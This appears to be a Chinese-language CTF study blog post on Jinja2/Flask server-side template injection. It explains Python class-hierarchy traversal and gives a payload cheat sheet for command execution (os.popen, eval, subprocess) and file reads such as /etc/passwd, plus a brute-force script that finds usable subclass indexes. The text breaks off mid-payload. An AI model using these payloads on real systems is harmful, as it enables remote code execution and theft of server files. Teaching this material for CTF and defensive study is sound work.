+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; ... &#125;</span><span class="language-xml">&#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;% ... %&#125;</span><span class="language-xml">：装载一个控制语句。</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;# <span class="name">...</span> #&#125;</span><span class="language-xml">：装载一个注释，模板渲染的时候会忽视这中间的值</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1><p>和bp实验室中的ssti不同，我这里主要针对jinjia的ssti，因为这是flask的默认模板, 下面的内容主要来自hello-ctf,我觉得说得很清楚了，我把主要内容贴在下面了，也可以直接去看源地址 <a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_7">https://hello-ctf.com/hc-web/ssti/#_7</a> </p>
+<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>对于大多数模板，他们的工作流程我们可以这样概括： <code>定义模板 -&gt; 传递数据 -&gt; 渲染模板 -&gt; 输出生成</code><br><img src="https://pic1.imgdb.cn/item/67d4365588c538a9b5bdb1cb.png"><br>模板注入(Server-Side Template Injection) 的原理和sql注入原理差不多，都是因为用户的输入来控制某种程序流<br>Jinja2 在渲染的时候会把 <code>&#123;&#123;&#125;&#125;</code> 包裹的内容当做变量解析替换，所以当我们传入 <code>&#123;&#123;表达式&#125;&#125;</code> 时，表达式就会被渲染器执行。<br>比如输入<code>&#123;&#123;7 * 7&#125;&#125;</code> 会渲染成49 </p>
+<h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><p>在可以的地方插入<code>&#123;&#123;7 * 7&#125;&#125;</code> 或 <code>&#123;&#123;config&#125;&#125;</code> 等 在页面上看有没有解析 来确定是否有注入点<br>一般的wp的payload都差不多是这样</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[40](<span class="name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[257](<span class="name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__import__(<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">......</span></span><br></pre></td></tr></table></figure></div>
+<p>为什么都是这样子呢 要先了解python中的几个知识点</p>
+<ul>
+<li>对象 : 在 Python 中 一切皆为对象 ，当你创建一个列表 []、一个字符串 “” 或一个字典 {} 时，你实际上是在创建不同类型的对象。</li>
+<li>继承 : 我们知道对象是类的实例，类是对象的模板。在我们创建一个对象的时候，其实就是创建了一个类的实例，而在 python 中所有的类都继承于一个基类，我们可以通过一些方法，从创建的对象反向查找它的类，以及对应类父类。这样我们就能从任意一个对象回到类的端点，也就是基类，再从端点任意的向下查找。</li>
+<li>魔术方法 : 我们如何去实现在继承中我们提到的过程呢？这就需要在上面 Payload 中类似 <code>__class__</code> 的魔术方法了，通过拼接不同作用的魔术方法来操控类，我们就能实现文件的读取或者命令的执行了。<br>我们大可以把我们在 SSTI 做的事情抽象成下面的代码：</li>
+</ul>
+<p>class O: pass # O 是基类，A、B、F、G 都直接或间接继承于它</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 继承关系 A -&gt; B -&gt; O</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">O</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># F 类继承自 O，拥有读取文件的方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>(<span class="title class_ inherited__">O</span>): <span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">self, file_name</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># G 类继承自 O，拥有执行系统命令的方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">G</span>(<span class="title class_ inherited__">O</span>): <span class="keyword">def</span> <span class="title function_">exec</span>(<span class="params">self, command</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>
+
+<p>比如我们现在就只拿到了 A，但我们想读取目录下面的 flag ，于是就有了下面的尝试：</p>
+<p>找对象 A 的类 - 类 A -&gt; 找类 A 的父亲 - 类 B -&gt; 找祖先 &#x2F; 基类 - 类 O -&gt; 遍历祖先下面所有的子类 -&gt; 找到可利用的类 类 F 类 G-&gt; 构造利用方法-&gt; 读写文件 &#x2F; 执行命令</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(A.__class__) <span class="comment"># 使用 __class__ 查看类属性</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(A.__class__.__base__) <span class="comment"># 使用 __base__ 查看父类</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(A.__class__.__base__.__base__)<span class="comment"># 查看父类的父类 (如果继承链足够长，就需要多个base)</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.O&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(A.__class__.__mro__) <span class="comment"># 直接使用 __mro__ 查看类继承关系顺序</span></span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.O&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(A.__class__.__base__.__base__.__subclasses__()) <span class="comment"># 查看祖先下面所有的子类（这里假定祖先为O）</span></span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.F&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.G&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure></div>
+<p>在 Python 中，所有类最终都继承自一个特殊的基类，名为 object。这是所有类的“祖先”，拿到它即可获取 Python 中所有的子类。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更多魔术方法可以在 SSTI 备忘录部分查看</span></span><br><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              查看继承关系和调用顺序，返回元组。此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br></pre></td></tr></table></figure></div>
+<h3 id="拿基类"><a href="#拿基类" class="headerlink" title="拿基类"></a>拿基类</h3><p>下面的这个例子是分别用<code>__mro__ __bases__ __base__ </code> 拿到基类的示例</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.Request&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__</span><br><span class="line"> (&lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.sansio.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;) <span class="comment"># 返回为元组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.JSONMixin&#x27;</span>&gt;) <span class="comment"># 返回为元组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__base__.__base__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+<h3 id="寻找子类"><a href="#寻找子类" class="headerlink" title="寻找子类"></a>寻找子类</h3><p>当我们拿到基类，也就是 &lt;class ‘object’&gt; 时，便可以直接使用 subclasses() 获取基类的所有子类了。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure></div>
+<p>我们只关心可以执行命令或者读取文件的子类，但是subclasses非常多，我们只要确定子类有没有os或者file的相关模块<br><img src="https://pic1.imgdb.cn/item/67d4394b88c538a9b5bdb2ed.png"><br>比如我们以存在 eval 函数的类为例子，我们不需要认识类名，我们只需要知道，这个类通过 <code>.__init__.__globals__.__builtins__[&#39;eval&#39;](&#39;&#39;)</code> 的方式可以调用 eval 的模块就好了。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__init__             初始化类，返回的类型是<span class="keyword">function</span></span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取函数所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身.</span><br></pre></td></tr></table></figure></div>
+<p>其实在面向对象的角度解释这样做很容易，对象是需要初始化的，而 <strong>init</strong> 的作用就是把我们选取的对象初始化，然后如何去使用对象中的方法呢？这就需要用到 <strong>globals</strong> 来获取对全局变量或模块的引用。<br>这时候问题就来了，我们在获取子类之后，要怎么找到内建函数有eval或者os等的呢<br>用python脚本或者模板语言都能自动化完成这个过程</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 脚本 用于寻找序号</span></span><br><span class="line">url = <span class="string">&quot;http://url/level/1&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_eval</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">find_eval(url)</span><br></pre></td></tr></table></figure></div>
+<p>这个code是我们测试出来的注入点，也可以用模板语言直接找到之后发送payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TWIG"><figure class="iseeu highlight /twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"> # 模板语法 _ 命令执行_eval</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">if</span> x.__init__ is defined and x.__init__.__globals__ is defined and <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval </span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># os.py</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># popen</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># _frozen_importlib.BuiltinImporter</span></span><br><span class="line">x[NUM][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># linecache</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess.Popen</span></span><br><span class="line">x[NUM](<span class="string">&#x27;ls /&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()</span><br></pre></td></tr></table></figure></div>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>由于 Python2 中的 File 类在 Python3 中被去掉了，所以目前也就 FileLoader ( _frozen_importlib_external.FileLoader) 算真正意义上原生的文件读取</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[]</span><span class="selector-class">.__class__</span><span class="selector-class">.__bases__</span><span class="selector-attr">[0]</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[NUM]</span><span class="selector-attr">[<span class="string">&quot;get_data&quot;</span>]</span>(<span class="number">0</span>,&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure></div>
+<p>其他文件读取的方法无非还是在命令执行的基础上去导入文件操作的包</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- codecs模块</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;codecs&#x27;).open(&#x27;/app/flag&#x27;).read()&quot;</span>) </span><br><span class="line"></span><br><span class="line">- pathlib模块</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;pathlib&#x27;).Path(&#x27;/app/flag&#x27;).read_text()&quot;</span>) </span><br><span class="line"></span><br><span class="line">- io模块</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;io&#x27;).open(&#x27;/app/flag&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">- <span class="built_in">open</span>函数</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;open(&#x27;/app/flag&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>内建函数有很多可用的方法，可以取出<code>__builtins__</code>中的内容 然后寻找文件和命令相关的函数，可以在python的官方文档中找到<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/functions.html">内置函数</a></p>
+<h2 id="Jinja-SSTI-备忘录"><a href="#Jinja-SSTI-备忘录" class="headerlink" title="Jinja SSTI 备忘录"></a>Jinja SSTI 备忘录</h2><h3 id="基类"><a href="#基类" class="headerlink" title="基类"></a>基类</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bases 会返回元组形式 </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__bases__[<span class="number">0</span>] == __base__</span><br><span class="line"><span class="comment">#因为 mro 会显示继承顺序，而所有类最终都继承自一个特殊的基类 object，所以 __mro__[-1] 总是能拿到基类</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__base__*N == __mro__[-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line"></span><br><span class="line">request.__class__.__mro__[-<span class="number">1</span>] <span class="comment"># 需要导入过 request 模块</span></span><br><span class="line"><span class="built_in">dict</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">config.__class__.__base__.__base__</span><br><span class="line">config.__class__.__base__.__base__</span><br></pre></td></tr></table></figure></div>
+<h3 id="通用-payload-Python3"><a href="#通用-payload-Python3" class="headerlink" title="通用 payload ( Python3 )"></a>通用 payload ( Python3 )</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令执行_eval</span></span><br><span class="line"> &#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行_os.py</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行_popen</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;popen&#x27;</span> <span 